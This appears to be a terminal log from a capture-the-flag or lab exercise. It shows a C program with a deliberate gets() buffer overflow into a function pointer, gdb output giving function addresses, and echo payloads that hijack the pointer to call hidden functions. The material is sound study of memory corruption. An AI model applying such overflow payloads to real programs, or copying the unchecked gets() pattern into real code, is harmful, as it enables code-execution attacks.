    ~/.ssh/known_hosts:77: [hashed name]
    ~/.ssh/known_hosts:78: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.77.8' (ED25519) to the list of known hosts.
user1@10.10.77.8's password: 
Last login: Wed Nov 27 21:42:30 2019 from 82.34.52.37

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
[user1@ip-10-10-77-8 ~]$ ls -la
total 16
drwx------ 7 user1 user1 169 Nov 27  2019 .
drwxr-xr-x 6 root  root   61 Sep  2  2019 ..
-rw------- 1 user1 user1 202 Nov 27  2019 .bash_history
-rw-r--r-- 1 user1 user1  18 Jul 27  2018 .bash_logout
-rw-r--r-- 1 user1 user1 193 Jul 27  2018 .bash_profile
-rw-r--r-- 1 user1 user1 231 Jul 27  2018 .bashrc
drwxr-xr-x 3 user1 user1  21 Nov 27  2019 .cache
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-1
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-2
drwxrwxr-x 2 user1 user1  72 Sep  2  2019 overflow-3
drwxrwxr-x 2 user1 user1  76 Sep  3  2019 overflow-4
[user1@ip-10-10-77-8 ~]$ cd overflow-2
[user1@ip-10-10-77-8 overflow-2]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c
[user1@ip-10-10-77-8 overflow-2]$ cat func-pointer.c 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
[user1@ip-10-10-77-8 overflow-2]$ gdb func-pointer
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from func-pointer...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  puts@plt
0x0000000000400470  printf@plt
0x0000000000400480  gets@plt
0x0000000000400490  _start
0x00000000004004c0  deregister_tm_clones
0x00000000004004f0  register_tm_clones
0x0000000000400530  __do_global_dtors_aux
0x0000000000400560  frame_dummy
0x0000000000400567  special
0x0000000000400582  normal
0x0000000000400593  other
0x00000000004005a9  main
0x00000000004005f0  __libc_csu_init
0x0000000000400660  __libc_csu_fini
0x0000000000400664  _fini
(gdb) q
[user1@ip-10-10-77-8 overflow-2]$
[user1@ip-10-10-15-3 overflow-2]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c
[user1@ip-10-10-15-3 overflow-2]$ echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./func-pointer
this is the special function
you did this, friend!
[user1@ip-10-10-15-3 overflow-2]$ echo -ne "12345678901234\x93\x05\x40\x0\x0\x0\x0\x0" | ./func-pointer
why is this here?[user1@ip-10-10-15-3 overflow-2]$ 
[user1@ip-10-10-15-3 overflow-2]$ 
```